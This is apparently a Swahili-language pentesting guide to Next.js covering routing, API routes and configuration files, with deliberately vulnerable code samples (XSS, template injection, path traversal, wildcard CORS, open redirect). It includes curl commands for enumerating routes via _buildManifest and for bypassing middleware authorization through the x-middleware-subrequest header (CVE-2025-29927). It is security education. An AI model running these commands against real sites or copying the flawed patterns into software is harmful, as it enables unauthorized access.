# NextJS

{{#include ../../banners/hacktricks-training.md}}

## Usanifu wa Jumla wa Programu ya Next.js

### Muundo wa Kawaida wa Faili

Mradi wa kawaida wa Next.js unafuata muundo maalum wa faili na saraka unaorahisisha vipengele vyake kama routing, API endpoints, na usimamizi wa mali statiki. Hapa kuna mpangilio wa kawaida:
```lua
my-nextjs-app/
├── node_modules/
├── public/
│   ├── images/
│   │   └── logo.png
│   └── favicon.ico
├── app/
│   ├── api/
│   │   └── hello/
│   │       └── route.ts
│   ├── layout.tsx
│   ├── page.tsx
│   ├── about/
│   │   └── page.tsx
│   ├── dashboard/
│   │   ├── layout.tsx
│   │   └── page.tsx
│   ├── components/
│   │   ├── Header.tsx
│   │   └── Footer.tsx
│   ├── styles/
│   │   ├── globals.css
│   │   └── Home.module.css
│   └── utils/
│       └── api.ts
├── .env.local
├── next.config.js
├── tsconfig.json
├── package.json
├── README.md
└── yarn.lock / package-lock.json

```
### Saraka za Msingi na Faili

- **public/:** Inahifadhi assets zisizobadilika kama picha, fonti, na faili nyingine. Faili hapa zinapatikana kwenye path ya root (`/`).
- **app/:** Saraka kuu ya pages, layouts, components, na API routes za application yako. Inakumbatia paradigms ya **App Router**, ikiruhusu features za routing za juu na utengano wa components za server na client.
- **app/layout.tsx:** Inaelezea root layout ya application yako, ikizunguka kurasa zote na kutoa vipengele vya UI kama header, footer, na navigation bar.
- **app/page.tsx:** Hutumika kama kiingilio kwa root route `/`, ikionyesha home page.
- **app/[route]/page.tsx:** Inashughulikia static na dynamic routes. Kila folda ndani ya `app/` inawakilisha segmento ya route, na `page.tsx` ndani ya hizo folda inalingana na component ya route.
- **app/api/:** Ina API routes, ikikuruhusu kuunda serverless functions zinazosimamia HTTP requests. Routes hizi zinachukua nafasi ya saraka ya zamani `pages/api`.
- **app/components/:** Ina React components zinazoweza kutumika tena katika kurasa na layouts tofauti.
- **app/styles/:** Inajumuisha faili za CSS za global na CSS Modules kwa styling inayolenga components.
- **app/utils/:** Inajumuisha utility functions, helper modules, na logic nyingine zisizo za UI ambazo zinaweza kushirikiwa ndani ya application.
- **.env.local:** Inahifadhi environment variables maalum kwa mazingira ya maendeleo ya eneo. Variables hizi **hazijakomitishwa** kwenye version control.
- **next.config.js:** Inabinafsisha tabia ya Next.js, ikijumuisha webpack configurations, environment variables, na settings za usalama.
- **tsconfig.json:** Inaweka settings za TypeScript kwa project, ikiruhusu type checking na features nyingine za TypeScript.
- **package.json:** Inasimamia dependencies za project, scripts, na metadata.
- **README.md:** Inatoa documentation na taarifa kuhusu project, ikiwa ni pamoja na maelekezo ya setup, mwongozo wa matumizi, na maelezo mengine muhimu.
- **yarn.lock / package-lock.json:** Inafunga dependencies za project kwenye versions maalum, kuhakikisha ufungaji thabiti katika mazingira tofauti.

## Client-Side katika Next.js

### Routing Inayotegemea Faili katika saraka ya `app`

Saraka ya `app` ni msingi wa routing katika toleo za hivi karibuni za Next.js. Inategemea mfumo wa faili kutaja routes, ikifanya usimamizi wa routes kuwa rahisi kuelewa na kuweza kupanuka.

<details>

<summary>Kushughulikia Path ya Msingi /</summary>

**Muundo wa Faili:**
```arduino
my-nextjs-app/
├── app/
│   ├── layout.tsx
│   └── page.tsx
├── public/
├── next.config.js
└── ...
```
**Mafaili Muhimu:**

- **`app/page.tsx`**: Inashughulikia maombi kwa njia ya mzizi `/`.
- **`app/layout.tsx`**: Inafafanua mpangilio wa programu, ukifunika kurasa zote.

**Utekelezaji:**
```tsx
tsxCopy code// app/page.tsx

export default function HomePage() {
return (
<div>
<h1>Welcome to the Home Page!</h1>
<p>This is the root route.</p>
</div>
);
}
```
**Maelezo:**

- **Ufafanuzi wa Route:** Faili `page.tsx` iliyoko moja kwa moja chini ya saraka `app` inahusiana na route `/`.
- **Uwasilishaji:** Komponenti hii inatoa maudhui ya ukurasa wa nyumbani.
- **Uunganishaji wa Layout:** Komponenti ya `HomePage` imefungwa na `layout.tsx`, ambayo inaweza kujumuisha vichwa vya ukurasa, miguso ya chini, na vipengele vingine vya kawaida.

</details>

<details>

<summary>Kushughulikia Njia Nyingine Zisizobadilika</summary>

**Mfano: Route ya `/about`**

**Muundo wa Faili:**
```arduino
arduinoCopy codemy-nextjs-app/
├── app/
│   ├── about/
│   │   └── page.tsx
│   ├── layout.tsx
│   └── page.tsx
├── public/
├── next.config.js
└── ...
```
**Utekelezaji:**
```tsx
// app/about/page.tsx

export default function AboutPage() {
return (
<div>
<h1>About Us</h1>
<p>Learn more about our mission and values.</p>
</div>
)
}
```
**Maelezo:**

- **Ufafanuzi wa Route:** Faili `page.tsx` ndani ya folda `about` inalingana na route `/about`.
- **Rendering:** Komponenti hii ina-render yaliyomo kwa ukurasa wa about.

</details>

<details>

<summary>Routes Dinamiki</summary>

Routes dinamik zinaruhusu kushughulikia paths zilizo na sehemu zinazobadilika, zikiruhusu applications kuonyesha yaliyomo kulingana na vigezo kama IDs, slugs, n.k.

**Mfano: `/posts/[id]` Route**

**Muundo wa Faili:**
```arduino
arduinoCopy codemy-nextjs-app/
├── app/
│   ├── posts/
│   │   └── [id]/
│   │       └── page.tsx
│   ├── layout.tsx
│   └── page.tsx
├── public/
├── next.config.js
└── ...
```
**Utekelezaji:**
```tsx
tsxCopy code// app/posts/[id]/page.tsx

import { useRouter } from 'next/navigation';

interface PostProps {
params: { id: string };
}

export default function PostPage({ params }: PostProps) {
const { id } = params;
// Fetch post data based on 'id'

return (
<div>
<h1>Post #{id}</h1>
<p>This is the content of post {id}.</p>
</div>
);
}
```
**Maelezo:**

- **Segmenti ya Dinamiki:** `[id]` inaonyesha segmenti ya dinamiki katika route, ikichukua parameter ya `id` kutoka kwenye URL.
- **Kupata Parameta:** objekti `params` ina parameta za dinamiki, zinazopatikana ndani ya komponenti.
- **Kulingana kwa Route:** Njia yoyote inayolingana na `/posts/*`, kama `/posts/1`, `/posts/abc`, n.k., itashughulikiwa na komponenti hii.

</details>

<details>

<summary>Routes Zilizowekwa Ndani</summary>

Next.js inaunga mkono nested routing, ikiruhusu muundo wa routes wa ngazi nyingi unaolingana na mpangilio wa directory.

**Mfano: `/dashboard/settings/profile` Njia**

**Muundo wa Faili:**
```arduino
arduinoCopy codemy-nextjs-app/
├── app/
│   ├── dashboard/
│   │   ├── settings/
│   │   │   └── profile/
│   │   │       └── page.tsx
│   │   └── page.tsx
│   ├── layout.tsx
│   └── page.tsx
├── public/
├── next.config.js
└── ...
```
**Utekelezaji:**
```tsx
tsxCopy code// app/dashboard/settings/profile/page.tsx

export default function ProfileSettingsPage() {
return (
<div>
<h1>Profile Settings</h1>
<p>Manage your profile information here.</p>
</div>
);
}
```
**Maelezo:**

- **Uwekaji ndani wa kina:** Faili ya `page.tsx` ndani ya `dashboard/settings/profile/` inalingana na route `/dashboard/settings/profile`.
- **Uakisi wa Hierarki:** Muundo wa saraka unaakisi njia ya URL, ukiboresha utunzaji na uwazi.

</details>

<details>

<summary>Njia za Catch-All</summary>

Njia za catch-all zinashughulikia sehemu nyingi zilizo ndani au njia zisizojulikana, zikitoa unyumbufu katika kushughulikia routes.

**Mfano: `/*` Njia**

**Muundo wa Faili:**
```arduino
my-nextjs-app/
├── app/
│   ├── [...slug]/
│   │   └── page.tsx
│   ├── layout.tsx
│   └── page.tsx
├── public/
├── next.config.js
└── ...
```
**Utekelezaji:**
```tsx
// app/[...slug]/page.tsx

interface CatchAllProps {
params: { slug: string[] }
}

export default function CatchAllPage({ params }: CatchAllProps) {
const { slug } = params
const fullPath = `/${slug.join("/")}`

return (
<div>
<h1>Catch-All Route</h1>
<p>You have navigated to: {fullPath}</p>
</div>
)
}
```
**Maelezo:**

- **Catch-All Segment:** `[...slug]` inakamata sehemu zote za path zinazobaki kama array.
- **Matumizi:** Inafaa kwa kushughulikia senario za routing zinazoibuka kama path zinazotengenezwa na watumiaji, makundi yaliyomo ndani, n.k.
- **Ulinganifu wa Route:** Njia kama `/anything/here`, `/foo/bar/baz`, n.k., zinaendeshwa na komponenti hii.

</details>

### Udhaifu za upande wa mteja

Ingawa Next.js inatoa msingi salama, mbinu zisizo sahihi za kuandika code zinaweza kuleta udhaifu. Udhaifu muhimu upande wa mteja ni pamoja na:

<details>

<summary>Cross-Site Scripting (XSS)</summary>

Mashambulizi ya XSS hutokea wakati skripti zenye madhara zinaingizwa kwenye tovuti zinazoaminika. Wavamizi wanaweza kuendesha skripti katika kivinjari cha mtumiaji, wakiwaiba data au kutekeleza vitendo kwa niaba ya mtumiaji.

**Mfano wa Code Yenye Udhaifu:**
```jsx
// Dangerous: Injecting user input directly into HTML
function Comment({ userInput }) {
return <div dangerouslySetInnerHTML={{ __html: userInput }} />
}
```
**Kwa Nini Ni Dhaifu:** Kutumia `dangerouslySetInnerHTML` na ingizo lisiloaminika kunawaruhusu washambuliaji kuingiza skripti zenye madhara.

</details>

<details>

<summary>Client-Side Template Injection</summary>

Hutokea wakati ingizo za watumiaji zinashughulikiwa vibaya ndani ya templates, na kuwaruhusu washambuliaji kuingiza na kutekeleza templates au maelezo.

**Mfano wa Code Yenye Udhaifu:**
```jsx
import React from "react"
import ejs from "ejs"

function RenderTemplate({ template, data }) {
const html = ejs.render(template, data)
return <div dangerouslySetInnerHTML={{ __html: html }} />
}
```
**Kwa Nini Ina Udhaifu:** Ikiwa `template` au `data` zina yaliyomo hatarishi, inaweza kusababisha utekelezaji wa msimbo usio kusudiwa.

</details>

<details>

<summary>Client Path Traversal</summary>

Ni udhaifu unaowaruhusu washambuliaji kurekebisha njia za upande wa mteja ili kufanya vitendo visivyo kusudiwa, kama Cross-Site Request Forgery (CSRF). Tofauti na server-side path traversal, ambayo inalenga mfumo wa faili wa server, CSPT inalenga kutumia mbinu za upande wa mteja kupelekesha tena maombi halali ya API kwa endpoints hatarishi.

**Mfano wa Msimbo Uliye Dhaifu:** 

A Next.js application inawawezesha watumiaji kupakia na kupakua faili. Kipengele cha kupakua kimetekelezwa upande wa mteja, ambako watumiaji wanaweza kubainisha njia ya faili wanayotaka kupakua.
```jsx
// pages/download.js
import { useState } from "react"

export default function DownloadPage() {
const [filePath, setFilePath] = useState("")

const handleDownload = () => {
fetch(`/api/files/${filePath}`)
.then((response) => response.blob())
.then((blob) => {
const url = window.URL.createObjectURL(blob)
const a = document.createElement("a")
a.href = url
a.download = filePath
a.click()
})
}

return (
<div>
<h1>Download File</h1>
<input
type="text"
value={filePath}
onChange={(e) => setFilePath(e.target.value)}
placeholder="Enter file path"
/>
<button onClick={handleDownload}>Download</button>
</div>
)
}
```
#### Senario ya Shambulizi

1. **Lengo la Mshambuliaji**: Kufanya shambulio la CSRF ili kufuta faili muhimu (mfano, `admin/config.json`) kwa kubadilisha `filePath`.
2. **Kutilia mbinu CSPT**:
- **Malicious Input**: Mshambuliaji anaunda URL yenye `filePath` iliyodanganywa kama `../deleteFile/config.json`.
- **Resulting API Call**: kodi upande wa mteja inatuma ombi `/api/files/../deleteFile/config.json`.
- **Server's Handling**: Ikiwa server haithibitishi `filePath`, inashughulikia ombi hilo, ikiwezekana kufuta au kufunua mafaili nyeti.
3. **Kutekeleza CSRF**:
- **Crafted Link**: Mshambuliaji anamtumia mwathiriwa kiungo au kuingiza script hatarishi inayochochea ombi la download lenye `filePath` iliyodanganywa.
- **Outcome**: Mwathiriwa bila kujua anatekeleza kitendo hicho, kikipelekea upatikanaji au kufutwa kwa faili bila idhini.

#### Kwa Nini Iko Hatari

- **Ukosefu wa Uthibitishaji wa Ingizo**: upande wa mteja unaruhusu ingizo lolote la `filePath`, likiwawezesha path traversal.
- **Kumwamini Ingizo kutoka upande wa mteja**: API upande wa server inamwamini na kushughulikia `filePath` bila kusafishwa.
- **Potential API Actions**: Ikiwa endpoint ya API inafanya vitendo vinavyobadilisha hali (mfano, delete, modify files), inaweza kutumika vibaya kupitia CSPT.

</details>

### Uchunguzi: ugunduzi wa routes za static export kupitia _buildManifest

When `nextExport`/`autoExport` are true (static export), Next.js exposes the `buildId` in the HTML and serves a build manifest at `/_next/static/<buildId>/_buildManifest.js`. The `sortedPages` array and route→chunk mapping there enumerate every prerendered page without brute force.

- Pata `buildId` kutoka kwa root response (mara nyingi imechapishwa chini) au kutoka kwa `<script>` tags zinazopakia `/_next/static/<buildId>/...`.
- Fetch the manifest and extract routes:
```bash
build=$(curl -s http://target/ | grep -oE '"buildId":"[^"]+"' | cut -d: -f2 | tr -d '"')
curl -s "http://target/_next/static/${build}/_buildManifest.js" | grep -oE '"(/[a-zA-Z0-9_\[\]\-/]+)"' | tr -d '"'
```
- Tumia njia zilizogunduliwa (kwa mfano `/docs`, `/docs/content/examples`, `/signin`) kuendesha auth testing na endpoint discovery.

## Upande wa Seva katika Next.js

### Uwasilishaji Upande wa Seva (SSR)

Kurasa huwasilishwa upande wa seva kwa kila ombi, kuhakikisha kwamba mtumiaji anapata HTML iliyotengenezwa kikamilifu. Katika kesi hii unapaswa kuunda seva yako maalum ili kushughulikia maombi.

**Matumizi:**

- Maudhui yanayobadilika mara kwa mara.
- Uboreshaji wa SEO, kwani injini za utafutaji zinaweza kuvinjari ukurasa uliotengenezwa kikamilifu.

**Utekelezaji:**
```jsx
// pages/index.js
export async function getServerSideProps(context) {
const res = await fetch("https://api.example.com/data")
const data = await res.json()
return { props: { data } }
}

function HomePage({ data }) {
return <div>{data.title}</div>
}

export default HomePage
```
### Uundaji wa Tovuti Thabiti (SSG)

Kurasa zinatayarishwa mapema wakati wa kujenga, na hivyo kusababisha nyakati za kupakia kuwa haraka zaidi na kupunguza mzigo wa seva.

**Matumizi:**

- Maudhui ambayo hayabadiliki mara kwa mara.
- Blogi, nyaraka, kurasa za masoko.

**Utekelezaji:**
```jsx
// pages/index.js
export async function getStaticProps() {
const res = await fetch("https://api.example.com/data")
const data = await res.json()
return { props: { data }, revalidate: 60 } // Revalidate every 60 seconds
}

function HomePage({ data }) {
return <div>{data.title}</div>
}

export default HomePage
```
### Fungsi za serverless (API Routes)

Next.js inaruhusu kuunda API endpoints kama fungsi za serverless. Fungsi hizi zinafanya kazi kwa ombi bila hitaji la server maalum.

**Matumizi:**

- Kushughulikia uwasilishaji wa fomu.
- Kushirikiana na hifadhidata.
- Kuchakata data au kuunganisha na APIs za wahusika wa tatu.

**Utekelezaji:**

Kwa kuanzishwa kwa saraka ya `app` katika Next.js 13, routing na kushughulikia API vimekuwa vya kubadilika zaidi na zenye nguvu. Njia hii ya kisasa inalingana kwa karibu na mfumo wa routing unaotegemea faili lakini huleta uwezo ulioboreshwa, ikiwa ni pamoja na msaada kwa server and client components.

#### Mtunzaji wa Route Msingi

**Muundo wa Faili:**
```go
my-nextjs-app/
├── app/
│   └── api/
│       └── hello/
│           └── route.js
├── package.json
└── ...
```
**Utekelezaji:**
```javascript
// app/api/hello/route.js

export async function POST(request) {
return new Response(JSON.stringify({ message: "Hello from App Router!" }), {
status: 200,
headers: { "Content-Type": "application/json" },
})
}

// Client-side fetch to access the API endpoint
fetch("/api/submit", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ name: "John Doe" }),
})
.then((res) => res.json())
.then((data) => console.log(data))
```
**Maelezo:**

- **Mahali:** Routes za API ziko chini ya saraka ya `app/api/`.
- **Majina ya Faili:** Kila endpoint ya API iko katika folda yake mwenyewe yenye faili ya `route.js` au `route.ts`.
- **Funsi Zilizotolewa:** Badala ya default export moja, funsi maalum za HTTP method (mf., `GET`, `POST`) zinatolewa.
- **Ushughulikiaji wa Majibu:** Tumia constructor ya `Response` kurudisha majibu, ikiruhusu udhibiti zaidi wa headers na status codes.

#### Jinsi ya kushughulikia njia na methods nyingine:

<details>

<summary>Kushughulikia method maalum za HTTP</summary>

Next.js 13+ inakuwezesha kufafanua handlers kwa method maalum za HTTP ndani ya faili moja ya `route.js` au `route.ts`, ikiboresha usomaji na upangaji wa code.

**Mfano:**
```javascript
// app/api/users/[id]/route.js

export async function GET(request, { params }) {
const { id } = params
// Fetch user data based on 'id'
return new Response(JSON.stringify({ userId: id, name: "Jane Doe" }), {
status: 200,
headers: { "Content-Type": "application/json" },
})
}

export async function PUT(request, { params }) {
const { id } = params
// Update user data based on 'id'
return new Response(JSON.stringify({ message: `User ${id} updated.` }), {
status: 200,
headers: { "Content-Type": "application/json" },
})
}

export async function DELETE(request, { params }) {
const { id } = params
// Delete user based on 'id'
return new Response(JSON.stringify({ message: `User ${id} deleted.` }), {
status: 200,
headers: { "Content-Type": "application/json" },
})
}
```
**Maelezo:**

- **Multiple Exports:** Kila HTTP method (`GET`, `PUT`, `DELETE`) ina function yake iliyotolewa.
- **Parameters:** Hoja ya pili inatoa ufikiaji wa vigezo za route kupitia `params`.
- **Enhanced Responses:** Udhibiti mkubwa zaidi juu ya response objects, ukiruhusu usimamizi sahihi wa headers na status code.

</details>

<details>

<summary>Catch-All na Nested Routes</summary>

Next.js 13+ inaunga mkono sifa za routing za hali ya juu kama catch-all routes na nested API routes, kuruhusu muundo za API kuwa zenye mabadiliko zaidi na zinaoweza kupanuka.

**Mfano wa Catch-All Route:**
```javascript
// app/api/[...slug]/route.js

export async function GET(request, { params }) {
const { slug } = params
// Handle dynamic nested routes
return new Response(JSON.stringify({ slug }), {
status: 200,
headers: { "Content-Type": "application/json" },
})
}
```
**Maelezo:**

- **Sintaksia:** `[...]` inamaanisha kipengele cha 'catch-all', kinachokamata njia zote zilizo ndani.
- **Matumizi:** Inafaa kwa APIs ambazo zinahitaji kushughulikia kina tofauti vya route au segmenti zinazobadilika.

**Mfano wa Nested Routes:**
```javascript
// app/api/posts/[postId]/comments/[commentId]/route.js

export async function GET(request, { params }) {
const { postId, commentId } = params
// Fetch specific comment for a post
return new Response(
JSON.stringify({ postId, commentId, comment: "Great post!" }),
{
status: 200,
headers: { "Content-Type": "application/json" },
}
)
}
```
**Maelezo:**

- **Deep Nesting:** Inaruhusu miundo ya API yenye tabaka nyingi, ikionyesha uhusiano wa rasilimali.
- **Parameter Access:** Upatikanaji wa vigezo — pata kwa urahisi vigezo vingi za route kupitia kitu cha `params`.

</details>

<details>

<summary>Kushughulikia API routes katika Next.js 12 na matoleo ya awali</summary>

## API Routes katika kabrasha la `pages` (Next.js 12 na matoleo ya awali)

Kabla Next.js 13 ilipotambulisha kabrasha la `app` na kuboresha uwezo wa routing, API routes zilitengenezwa hasa ndani ya kabrasha la `pages`. Mbinu hii bado inatumiwa sana na inasaidiwa katika Next.js 12 na matoleo ya awali.

#### API Route ya Msingi

**Muundo wa Faili:**
```go
goCopy codemy-nextjs-app/
├── pages/
│   └── api/
│       └── hello.js
├── package.json
└── ...
```
**Utekelezaji:**
```javascript
javascriptCopy code// pages/api/hello.js

export default function handler(req, res) {
res.status(200).json({ message: 'Hello, World!' });
}
```
**Ufafanuzi:**

- **Mahali:** API routes ziko chini ya `pages/api/` directory.
- **Export:** Tumia `export default` kufafanua handler function.
- **Function Signature:** Handler inapokea `req` (HTTP request) na `res` (HTTP response) objects.
- **Routing:** Jina la faili (`hello.js`) linaambatana na endpoint `/api/hello`.

#### Njia za API zinazobadilika

**Muundo wa Faili:**
```bash
bashCopy codemy-nextjs-app/
├── pages/
│   └── api/
│       └── users/
│           └── [id].js
├── package.json
└── ...
```
**Utekelezaji:**
```javascript
javascriptCopy code// pages/api/users/[id].js

export default function handler(req, res) {
const {
query: { id },
method,
} = req;

switch (method) {
case 'GET':
// Fetch user data based on 'id'
res.status(200).json({ userId: id, name: 'John Doe' });
break;
case 'PUT':
// Update user data based on 'id'
res.status(200).json({ message: `User ${id} updated.` });
break;
case 'DELETE':
// Delete user based on 'id'
res.status(200).json({ message: `User ${id} deleted.` });
break;
default:
res.setHeader('Allow', ['GET', 'PUT', 'DELETE']);
res.status(405).end(`Method ${method} Not Allowed`);
}
}
```
**Maelezo:**

- **Segmenti Dinamiki:** Mabano ya mraba (`[id].js`) yanaonyesha segmenti za route zinazobadilika.
- **Kupata Vigezo:** Tumia `req.query.id` kupata kigezo kinachobadilika.
- **Kushughulikia Mbinu:** Tumia mantiki za masharti kushughulikia mbinu tofauti za HTTP (`GET`, `PUT`, `DELETE`, n.k).

#### Kushughulikia Mbinu Tofauti za HTTP

Wakati mfano wa msingi wa API route unashughulikia mbinu zote za HTTP ndani ya kazi moja, unaweza kupanga msimbo wako kushughulikia kila method kwa uwazi zaidi na utunzaji rahisi.

**Mfano:**
```javascript
javascriptCopy code// pages/api/posts.js

export default async function handler(req, res) {
const { method } = req;

switch (method) {
case 'GET':
// Handle GET request
res.status(200).json({ message: 'Fetching posts.' });
break;
case 'POST':
// Handle POST request
res.status(201).json({ message: 'Post created.' });
break;
default:
res.setHeader('Allow', ['GET', 'POST']);
res.status(405).end(`Method ${method} Not Allowed`);
}
}
```
**Mbinu Bora:**

- **Tenganisho la Majukumu:** Tenganisha wazi mantiki kwa ajili ya HTTP methods tofauti.
- **Ulinganifu wa Majibu:** Hakikisha muundo wa majibu ni thabiti ili kurahisisha kushughulikia upande wa mteja.
- **Shughulikia Makosa:** Shughulikia kwa heshima methods zisizoungwa mkono na makosa yasiyotarajiwa.

</details>

### Usanidi wa CORS

Dhibiti origins zinazoweza kufikia API routes zako, kupunguza udhaifu wa Cross-Origin Resource Sharing (CORS) vulnerabilities.

**Mfano wa Usanidi Mbaya:**
```javascript
// app/api/data/route.js

export async function GET(request) {
return new Response(JSON.stringify({ data: "Public Data" }), {
status: 200,
headers: {
"Access-Control-Allow-Origin": "*", // Allows any origin
"Access-Control-Allow-Methods": "GET, POST, PUT, DELETE",
},
})
}
```
Kumbuka kwamba **CORS pia inaweza kusanidiwa katika njia zote za API** ndani ya faili ya **`middleware.ts`**:
```javascript
// app/middleware.ts

import { NextResponse } from "next/server"
import type { NextRequest } from "next/server"

export function middleware(request: NextRequest) {
const allowedOrigins = [
"https://yourdomain.com",
"https://sub.yourdomain.com",
]
const origin = request.headers.get("Origin")

const response = NextResponse.next()

if (allowedOrigins.includes(origin || "")) {
response.headers.set("Access-Control-Allow-Origin", origin || "")
response.headers.set(
"Access-Control-Allow-Methods",
"GET, POST, PUT, DELETE, OPTIONS"
)
response.headers.set(
"Access-Control-Allow-Headers",
"Content-Type, Authorization"
)
// If credentials are needed:
// response.headers.set('Access-Control-Allow-Credentials', 'true');
}

// Handle preflight requests
if (request.method === "OPTIONS") {
return new Response(null, {
status: 204,
headers: response.headers,
})
}

return response
}

export const config = {
matcher: "/api/:path*", // Apply to all API routes
}
```
**Tatizo:**

- **`Access-Control-Allow-Origin: '*'`:** Inaruhusu tovuti yoyote kufikia API, na hivyo kuweza kuruhusu tovuti zenye nia mbaya kuingiliana na API yako bila vikwazo.
- **Kuruhusu njia za HTTP zote:** Kuruhusu njia zote kunaweza kuwaruhusu washambuliaji kufanya vitendo visivyotakikana.

**Jinsi washambuliaji wanavyovitumia:**

Washambuliaji wanaweza kuunda tovuti zenye nia mbaya zinazofanya maombi kwa API yako, na kwa hivyo kuweza kutumilia vibaya huduma kama vile kuchukua data, kubadilisha data, au kusababisha vitendo visivyotakikana kwa niaba ya watumiaji walioidhinishwa.


{{#ref}}
../../pentesting-web/cors-bypass.md
{{#endref}}

### Ufunuliwa wa code ya seva upande wa mteja

Ni rahisi **kutumia code inayotumika kwenye server pia katika code inayofichuliwa na kutumika upande wa mteja**, njia bora ya kuhakikisha kwamba faili ya code haifichuliwi upande wa mteja ni kwa kutumia import hii mwanzoni mwa faili:
```js
import "server-only"
```
## Faili Muhimu na Majukumu Yao

### `middleware.ts` / `middleware.js`

**Location:** Mzizi wa mradi au ndani ya `src/`.

**Purpose:** Inatekeleza msimbo katika server-side serverless function kabla ya ombi kushughulikiwa, ikiruhusu kazi kama uthibitishaji, kupeleka tena (redirects), au kurekebisha majibu.

**Execution Flow:**

1. **Incoming Request:** Middleware inakata ombi.
2. **Processing:** Hufanya operesheni kulingana na ombi (mf., ukaguzi wa uthibitishaji).
3. **Response Modification:** Inaweza kubadilisha majibu au kupitisha udhibiti kwa mshughulikiaji inayofuata.

**Example Use Cases:**

- Kupeleka tena watumiaji wasiothibitishwa.
- Kuongeza headers maalum.
- Kurekodi maombi.

**Sample Configuration:**
```typescript
// middleware.ts
import { NextResponse } from "next/server"
import type { NextRequest } from "next/server"

export function middleware(req: NextRequest) {
const url = req.nextUrl.clone()
if (!req.cookies.has("token")) {
url.pathname = "/login"
return NextResponse.redirect(url)
}
return NextResponse.next()
}

export const config = {
matcher: ["/protected/:path*"],
}
```
### Middleware authorization bypass (CVE-2025-29927)

Ikiwa authorization imefanywa katika middleware, matoleo ya Next.js yaliyoathiriwa (<12.3.5 / 13.5.9 / 14.2.25 / 15.2.3) yanaweza kupitishwa kwa kuingiza header `x-middleware-subrequest`. Mfumo utaepuka middleware recursion na kurudisha ukurasa uliolindwa.

- Tabia ya msingi kawaida ni redirect ya 307 kwenda kwenye route ya login kama `/api/auth/signin`.
- Tuma thamani ndefu ya `x-middleware-subrequest` (rudia `middleware` hadi ufikie `MAX_RECURSION_DEPTH`) ili kubadilisha response kuwa 200:
```bash
curl -i "http://target/docs" \
-H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware"
```
- Kwa sababu kurasa zilizothibitishwa zinapakia subresources nyingi, ongeza header kwa kila ombi (mfano: Burp Match/Replace kwa match string tupu) ili kuzuia assets kupelekwa kwa redirect.

### `next.config.js`

**Location:** Mzizi wa mradi.

**Purpose:** Confugures Next.js behavior, enabling or disabling features, customizing webpack configurations, setting environment variables, and configuring several security features.

**Key Security Configurations:**

<details>

<summary>Vichwa vya Usalama</summary>

Vichwa vya usalama vinaimarisha usalama wa programu yako kwa kuelekeza browsers jinsi ya kushughulikia yaliyomo. Husaidia kupunguza mashambulizi mbalimbali kama Cross-Site Scripting (XSS), Clickjacking, na MIME type sniffing:

- Content Security Policy (CSP)
- X-Frame-Options
- X-Content-Type-Options
- Strict-Transport-Security (HSTS)
- Referrer Policy

**Mifano:**
```javascript
// next.config.js

module.exports = {
async headers() {
return [
{
source: "/(.*)", // Apply to all routes
headers: [
{
key: "X-Frame-Options",
value: "DENY",
},
{
key: "Content-Security-Policy",
value:
"default-src *; script-src 'self' 'unsafe-inline' 'unsafe-eval';",
},
{
key: "X-Content-Type-Options",
value: "nosniff",
},
{
key: "Strict-Transport-Security",
value: "max-age=63072000; includeSubDomains; preload", // Enforces HTTPS
},
{
key: "Referrer-Policy",
value: "no-referrer", // Completely hides referrer
},
// Additional headers...
],
},
]
},
}
```
</details>

<details>

<summary>Mipangilio ya Uboreshaji wa Picha</summary>

Next.js huiboresha picha kwa ajili ya utendaji, lakini usanidi mbaya unaweza kusababisha udhaifu wa usalama, kama vile kuruhusu vyanzo visivyo vya kuaminika kuingiza maudhui hatarishi.

**Mfano wa Usanidi Mbaya:**
```javascript
// next.config.js

module.exports = {
images: {
domains: ["*"], // Allows images from any domain
},
}
```
**Tatizo:**

- **`'*'`:** Inaruhusu picha kupakiwa kutoka kwa chanzo chochote cha nje, ikijumuisha vikoa visivyoaminika au vya hasidi. Wadukuzi wanaweza kuegesha picha zenye payload hatari au yaliyomo yanayowadanganya watumiaji.
- Tatizo jingine linaweza kuwa kuruhusu domaini **ambapo mtu yeyote anaweza kupakia picha** (kama `raw.githubusercontent.com`)

**Jinsi wadukuzi wanavyokitumia:**

Kwa kuingiza picha kutoka vyanzo vya hasidi, wadukuzi wanaweza kufanya mashambulizi ya phishing, kuonyesha taarifa za kuwadanganya, au kutumia udhaifu katika maktaba za kuonyesha picha.

</details>

<details>

<summary>Ufunuo wa vigezo vya mazingira</summary>

Dhibiti taarifa nyeti kama API keys na database credentials kwa usalama bila kuzifunua kwa client.

#### a. Kufichua vigezo nyeti

**Mfano wa mipangilio mbaya:**
```javascript
// next.config.js

module.exports = {
env: {
SECRET_API_KEY: process.env.SECRET_API_KEY, // Exposed to the client
NEXT_PUBLIC_API_URL: process.env.NEXT_PUBLIC_API_URL, // Correctly prefixed for client
},
}
```
**Tatizo:**

- **`SECRET_API_KEY`:** Bila kiambishi cha `NEXT_PUBLIC_`, Next.js haitolei variables kwa client. Hata hivyo, ikiwa kwa makosa imepewa kiambishi hicho (kwa mfano, `NEXT_PUBLIC_SECRET_API_KEY`), inakuwa inapatikana upande wa client.

**Jinsi washambuliaji wanavyovitumia:**

Ikiwa variables nyeti zimetolewa kwa client, washambuliaji wanaweza kuzipata kwa kuchunguza client-side code au network requests, na hivyo kupata ufikiaji usioruhusiwa wa APIs, databases, au services nyingine.

</details>

<details>

<summary>Uelekezaji wa URL</summary>

Dhibiti uelekezo na uandishi upya wa URL ndani ya application yako, kuhakikisha watumiaji wanaelekezwa ipasavyo bila kuanzisha open redirect vulnerabilities.

#### a. Open Redirect Vulnerability

**Mfano wa Mipangilio Mbaya:**
```javascript
// next.config.js

module.exports = {
async redirects() {
return [
{
source: "/redirect",
destination: (req) => req.query.url, // Dynamically redirects based on query parameter
permanent: false,
},
]
},
}
```
**Tatizo:**

- **Dynamic Destination:** Inaruhusu watumiaji kubainisha URL yoyote, hivyo kuwezesha open redirect attacks.
- **Kutegemea Ingizo la Mtumiaji:** Kuelekeza kwa URLs zinazotolewa na watumiaji bila uhakiki kunaweza kusababisha phishing, malware distribution, au credential theft.

**Jinsi wadukuzi wanavyovitumia:**

Wadukuzi wanaweza kutengeneza URLs zinazoonekana kuwa zinatoka kwenye domain yako lakini kuzipeleka watumiaji kwenye tovuti zenye madhara. Kwa mfano:
```bash
https://yourdomain.com/redirect?url=https://malicious-site.com
```
Watumiaji wanaomwamini domain ya asili wanaweza bila kujua kutembelea tovuti hatarishi.

</details>

<details>

<summary>Webpack Configuration</summary>

Badilisha Webpack configurations kwa Next.js application yako, ambayo kwa bahati mbaya inaweza kuleta udhaifu wa usalama ikiwa haitashughulikiwa kwa tahadhari.

